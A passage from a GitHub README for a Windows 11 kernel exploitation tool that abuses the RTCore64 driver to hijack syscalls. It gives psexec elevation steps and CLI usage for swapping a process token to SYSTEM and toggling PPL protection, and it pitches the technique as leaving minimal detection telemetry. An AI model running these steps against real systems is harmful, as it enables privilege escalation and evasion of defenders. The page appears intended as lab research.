+<li><strong>Constraining the IOC window.</strong> If incident responders look for "process X talked to RTCore64 between T and T+10s," they get a tiny window to correlate against — versus the entire implant lifetime.</li>
+</ul>
+<blockquote>
+<p dir="auto">Combined with the HVCI/VBS bypass story above, the full claim is: this technique runs <strong>on a fully-hardened Win11 box</strong> while leaving <strong>the minimum possible BYOVD telemetry footprint</strong> for an arbitrary-kernel-R/W primitive — one setup burst, then ordinary-looking syscalls.</p>
+</blockquote>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">✅ POC (Proof of Concept)</h3><a id="user-content--poc-proof-of-concept" class="anchor" aria-label="Permalink: ✅ POC (Proof of Concept)" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-poc-proof-of-concept"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">To run this POC successfully, you must execute it as SYSTEM. This is because the code uses EnumDeviceDrivers to leak the kernel base address — a technique that no longer works from medium integrity on recent versions of Windows 11.</p>
+<p dir="auto">🔧 Elevation Tip
+To elevate to SYSTEM privileges, you can use Sysinternals' PSExec:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>psexec.exe -i -s cmd.exe
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="psexec.exe -i -s cmd.exe" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">This will launch a command shell as SYSTEM, allowing the exploit to function correctly.</p>
+<p dir="auto">🕵️ Alternative (Medium Integrity)
+If you're restricted to medium integrity, you can use a side-channel technique to leak the kernel base address instead nowadays. A tool for this is available here:</p>
+<p dir="auto">👉 <a href="https://github.com/exploits-forsale/prefetch-tool">https://github.com/exploits-forsale/prefetch-tool</a></p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">CLI</h4><a id="user-content-cli" class="anchor" aria-label="Permalink: CLI" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#cli"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>KernelCodeExecution.exe /installDriver              # one-shot: register RTCore64.sys
+KernelCodeExecution.exe /codeexecution &lt;PID&gt;        # demo 1: read target process's image name
+KernelCodeExecution.exe /privesc       &lt;PID&gt;        # demo 2: swap target's token to SYSTEM
+KernelCodeExecution.exe /ppl           &lt;PID&gt; &lt;0|1&gt;  # demo 3: toggle PPL via 1-byte kernel memcpy
+KernelCodeExecution.exe /uninstallDriver            # cleanup
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="KernelCodeExecution.exe /installDriver              # one-shot: register RTCore64.sys
+KernelCodeExecution.exe /codeexecution <PID>        # demo 1: read target process's image name
+KernelCodeExecution.exe /privesc       <PID>        # demo 2: swap target's token to SYSTEM
+KernelCodeExecution.exe /ppl           <PID> <0|1>  # demo 3: toggle PPL via 1-byte kernel memcpy
+KernelCodeExecution.exe /uninstallDriver            # cleanup" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/blob/main/screenshots/POC.png"><img src="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/raw/main/screenshots/POC.png" alt="POC" style="max-width: 100%;"></a></p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🧯 Warning</h3><a id="user-content--warning" class="anchor" aria-label="Permalink: 🧯 Warning" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-warning"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">This code operates in kernel space and modifies protected memory. It <strong>must not</strong> be used in production or against systems you don’t own. Tampering with kernel memory can lead to <strong>system crashes</strong>, <strong>BSODs</strong>, and <strong>security violations</strong>.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">✅ Conclusion</h3><a id="user-content--conclusion" class="anchor" aria-label="Permalink: ✅ Conclusion" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-conclusion"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Hijacking syscall entries like this demonstrates the power and risks of low-level Windows exploitation. Proper memory manipulation, address resolution, and cleanup are all critical for success and system stability.</p>
+<p dir="auto">Use this responsibly — and only in lab environments.</p>
+</article></div></div></div></div></div></div></div><div class="prc-PageLayout-PaneWrapper-pHPop pr-2" style="--offset-header:0px;--spacing-row:var(--spacing-none);--spacing-column:var(--spacing-none)" data-is-hidden="false" data-position="end"><div class="prc-PageLayout-HorizontalDivider-JLVqp prc-PageLayout-PaneHorizontalDivider-9tbnE" data-component="PageLayout.HorizontalDivider" data-variant-narrow="none" data-variant-regular="none" data-position="end" style="--spacing-divider:var(--spacing-none);--spacing:var(--spacing-none)"></div><div class="prc-PageLayout-Pane-AyzHK" data-component="PageLayout.Pane" style="--spacing:var(--spacing-normal);--pane-min-width:256px;--pane-max-width:calc(100vw - var(--pane-max-width-diff));--pane-width-size:var(--pane-width-large);--pane-width:320px"><rails-partial data-partial-name="codeViewRepoRoute.Sidebar" class="RailsPartial-module__d-contents__G5m4w">
+
+<div class="BorderGrid ">
+  <div class="BorderGrid-row">
+    <div class="BorderGrid-cell">
+      <div class="hide-sm hide-md">
+  <h2 class="tmp-mb-3 h4">About</h2>
+
+      <p class="f4 tmp-my-3">
+        Executing Kernel Routines via Syscall Table Hijack (Kernel Code Execution)
+      </p>
+
+    <h3 class="sr-only">Topics</h3>
+    <div class="tmp-my-3">
+        <div class="f6">
+      <a href="https://github.com/topics/kernel" title="Topic: kernel" data-view-component="true" class="topic-tag topic-tag-link">
+  kernel
+</a>
+      <a href="https://github.com/topics/reverse-engineering" title="Topic: reverse-engineering" data-view-component="true" class="topic-tag topic-tag-link">
+  reverse-engineering
+</a>
+      <a href="https://github.com/topics/kernel-exploitation" title="Topic: kernel-exploitation" data-view-component="true" class="topic-tag topic-tag-link">
+  kernel-exploitation
+</a>
+      <a href="https://github.com/topics/kernel-exploit" title="Topic: kernel-exploit" data-view-component="true" class="topic-tag topic-tag-link">
+  kernel-exploit
+</a>
+      <a href="https://github.com/topics/windows-11" title="Topic: windows-11" data-view-component="true" class="topic-tag topic-tag-link">
+  windows-11
+</a>
+  </div>
+
+    </div>
+
+    <h3 class="sr-only">Resources</h3>
+    <div class="mt-2">
+      <a class="Link--muted" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:readme&quot;}" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#readme-ov-file">
+        <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book mr-2 tmp-mr-2">
+    <path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path>
+</svg>
+        Readme
+</a>    </div>
+
+  
+
+
+
+
+
+  <include-fragment src="/V-i-x-x/win11-kernel-execution-syscall-hijack/hovercards/citation/sidebar_partial?tree_name=main" data-nonce="v2:8e447753-1231-32f2-1344-6277682ef46b" data-view-component="true" class="is-error"><slot></slot>
+  
+
+  <div data-show-on-forbidden-error="">
+    <div class="Box">
+  <div class="blankslate-container">
+    <div data-view-component="true" class="blankslate blankslate-spacious color-bg-default rounded-2">
+      
+
+      <h3 data-view-component="true" class="blankslate-heading">        Uh oh!
+</h3>
+      <p data-view-component="true" class="blankslate-description">        </p><p class="color-fg-muted my-2 mb-2 ws-normal">There was an error while loading. <a class="Link--inTextBlock" data-turbo="false" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack" aria-label="Please reload this page">Please reload this page</a>.</p>
+<p></p>
+
+</div>  </div>
+</div>  </div>
+</include-fragment>
+    <div class="mt-2">
+      <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/activity" data-view-component="true" class="Link Link--muted"><svg text="gray" aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pulse mr-2 tmp-mr-2">
+    <path d="M6 2c.306 0 .582.187.696.471L10 10.731l1.304-3.26A.751.751 0 0 1 12 7h3.25a.75.75 0 0 1 0 1.5h-2.742l-1.812 4.528a.751.751 0 0 1-1.392 0L6 4.77 4.696 8.03A.75.75 0 0 1 4 8.5H.75a.75.75 0 0 1 0-1.5h2.742l1.812-4.529A.751.751 0 0 1 6 2Z"></path>
+</svg>
+        <span class="color-fg-muted">Activity</span></a>    </div>
+
+
+    <h3 class="sr-only">Stars</h3>
+    <div class="mt-2">
+        <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/stargazers" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star mr-2 tmp-mr-2">
+    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
+</svg>
+          <strong>80</strong>
+          stars</a>    </div>
+
+    <h3 class="sr-only">Watchers</h3>
+    <div class="mt-2">
+        <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/watchers" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-eye mr-2 tmp-mr-2">
+    <path d="M8 2c1.981 0 3.671.992 4.933 2.078 1.27 1.091 2.187 2.345 2.637 3.023a1.62 1.62 0 0 1 0 1.798c-.45.678-1.367 1.932-2.637 3.023C11.67 13.008 9.981 14 8 14c-1.981 0-3.671-.992-4.933-2.078C1.797 10.83.88 9.576.43 8.898a1.62 1.62 0 0 1 0-1.798c.45-.677 1.367-1.931 2.637-3.022C4.33 2.992 6.019 2 8 2ZM1.679 7.932a.12.12 0 0 0 0 .136c.411.622 1.241 1.75 2.366 2.717C5.176 11.758 6.527 12.5 8 12.5c1.473 0 2.825-.742 3.955-1.715 1.124-.967 1.954-2.096 2.366-2.717a.12.12 0 0 0 0-.136c-.412-.621-1.242-1.75-2.366-2.717C10.824 4.242 9.473 3.5 8 3.5c-1.473 0-2.825.742-3.955 1.715-1.124.967-1.954 2.096-2.366 2.717ZM8 10a2 2 0 1 1-.001-3.999A2 2 0 0 1 8 10Z"></path>
+</svg>
+          <strong>0</strong>
+          watching</a>    </div>
+
+    <h3 class="sr-only">Forks</h3>
+    <div class="mt-2">
+      <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/forks" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2 tmp-mr-2">
+    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+</svg>
+        <strong>11</strong>
+        forks</a>    </div>
+
+
+    <div class="mt-2">
+      <a class="Link--muted" href="https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FV-i-x-x%2Fwin11-kernel-execution-syscall-hijack&amp;report=V-i-x-x+%28user%29">
+          Report repository
+</a>    </div>
+</div>
+
+    </div>
+  </div>
+
+  
+      <div class="BorderGrid-row">
+        <div class="BorderGrid-cell">
+          <h2 class="h4 tmp-mb-3" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame">
+  <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/releases" data-view-component="true" class="Link--primary no-underline Link" data-turbo-frame="repo-content-turbo-frame">Releases</a></h2>
+
+    <div class="text-small color-fg-muted">No releases published</div>
+
+        </div>
+      </div>
+
+  
+  
+  
+      <div class="BorderGrid-row">
+        <div class="BorderGrid-cell">
+          
+<h2 class="h4 tmp-mb-3">
+  <a href="https://github.com/users/V-i-x-x/packages?repo_name=win11-kernel-execution-syscall-hijack" data-view-component="true" class="Link--primary no-underline Link d-flex flex-items-center">Packages
+      <span title="0" data-view-component="true" class="Counter ml-1 tmp-ml-1">0</span></a></h2>
+
+
+
+      <div class="text-small color-fg-muted">
+        No packages published <br>
+      </div>
+
+
+
+        </div>
+      </div>
+
+  
+  
+    <div class="BorderGrid-row">
+      <div class="BorderGrid-cell">
+        
+  <h2 class="h4 tmp-mb-3">
+  <a href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/graphs/contributors" data-view-component="true" class="Link--primary no-underline Link d-flex flex-items-center">Contributors
+      <span title="1" data-view-component="true" class="Counter ml-1 tmp-ml-1">1</span></a></h2>
+
+
+      
+  <ul class="list-style-none ">
+    <li class="mb-2 d-flex">
+      <a href="https://github.com/V-i-x-x" class="mr-2" data-hovercard-type="user" data-hovercard-url="/users/V-i-x-x/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp">
+        <img src="https://avatars.githubusercontent.com/u/21037679?s=64&amp;v=4" alt="@V-i-x-x" size="32" height="32" width="32" data-view-component="true" class="avatar circle">
+      </a>
+      <span data-view-component="true" class="flex-self-center min-width-0 css-truncate css-truncate-overflow width-fit flex-auto">
+        <a href="https://github.com/V-i-x-x" class="Link--primary no-underline flex-self-center">
+          <strong>V-i-x-x</strong>
+          <span class="color-fg-muted">Vixx</span>
+        </a>
+</span>    </li>
+</ul>
+
+
+
+
+
+
+      </div>
+    </div>
+
+  
+      <div class="BorderGrid-row">
+        <div class="BorderGrid-cell">
+          <h2 class="h4 tmp-mb-3">Languages</h2>
+<div class="mb-2">
+  <span data-view-component="true" class="Progress">
+    <span style="background-color:#f34b7d !important;;width: 88.9%;" itemprop="keywords" data-view-component="true" class="Progress-item color-bg-success-emphasis"></span>
+    <span style="background-color:#555555 !important;;width: 9.1%;" itemprop="keywords" data-view-component="true" class="Progress-item color-bg-success-emphasis"></span>
+    <span style="background-color:#6E4C13 !important;;width: 2.0%;" itemprop="keywords" data-view-component="true" class="Progress-item color-bg-success-emphasis"></span>
+</span></div>
+<ul class="list-style-none">
+    <li class="d-inline">
+        <a class="d-inline-flex flex-items-center flex-nowrap Link--secondary no-underline text-small tmp-mr-3" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/search?l=c%2B%2B" data-ga-click="Repository, language stats search click, location:repo overview">
+          <svg style="color:#f34b7d;" aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill mr-2 tmp-mr-2">
+    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
+</svg>
+          <span class="color-fg-default text-bold mr-1">C++</span>
+          <span>88.9%</span>
+        </a>
+    </li>
+    <li class="d-inline">
+        <a class="d-inline-flex flex-items-center flex-nowrap Link--secondary no-underline text-small tmp-mr-3" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/search?l=c" data-ga-click="Repository, language stats search click, location:repo overview">
+          <svg style="color:#555555;" aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill mr-2 tmp-mr-2">
+    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
+</svg>
+          <span class="color-fg-default text-bold mr-1">C</span>
+          <span>9.1%</span>
+        </a>
+    </li>
+    <li class="d-inline">
+        <a class="d-inline-flex flex-items-center flex-nowrap Link--secondary no-underline text-small tmp-mr-3" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/search?l=assembly" data-ga-click="Repository, language stats search click, location:repo overview">
+          <svg style="color:#6E4C13;" aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill mr-2 tmp-mr-2">
+    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
+</svg>
+          <span class="color-fg-default text-bold mr-1">Assembly</span>
+          <span>2.0%</span>
+        </a>
+    </li>
+</ul>
+
+        </div>
+      </div>
+
+  
+  </div>
+</rails-partial></div><div class="prc-PageLayout-VerticalDivider-9QRmK prc-PageLayout-PaneVerticalDivider-le57g" data-component="PageLayout.VerticalDivider" data-variant-narrow="none" data-variant-regular="none" data-position="end" style="--spacing:var(--spacing-none)"></div></div></div></div></div></div></div></div></div></div></div><div class="ScrollMarksContainer-module__scrollMarksContainer__Eu7uU" id="find-result-marks-container"></div><div class="d-none"></div><div class="d-none"></div></div> <!-- --> <!-- --> </div>
+</react-app>
+
+
+
+
+  </div>
+
+</turbo-frame>
+
+    </main>
+  </div>
+
+  </div>
+
+          
+
+
+
+    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-locale="en" data-initial-cookie-consent-allowed="" data-cookie-consent-required="false" data-catalyst=""></ghcc-consent>
+
+
+
+
+  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
+    <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    You can’t perform that action at this time.
+  </div>
+
+    
+  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open="">
+    <summary role="button" aria-label="Close dialog"></summary>
+    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
+      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog="">
+        <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+      </button>
+      <div class="octocat-spinner tmp-my-6 js-details-dialog-spinner"></div>
+    </details-dialog>
+  </details>
+
+
+    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
+  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;"></div>
+</div>
+
+    
+  <div class="zeroclipboard-container position-absolute right-0 top-0">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2 tmp-m-2">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2 tmp-m-2">
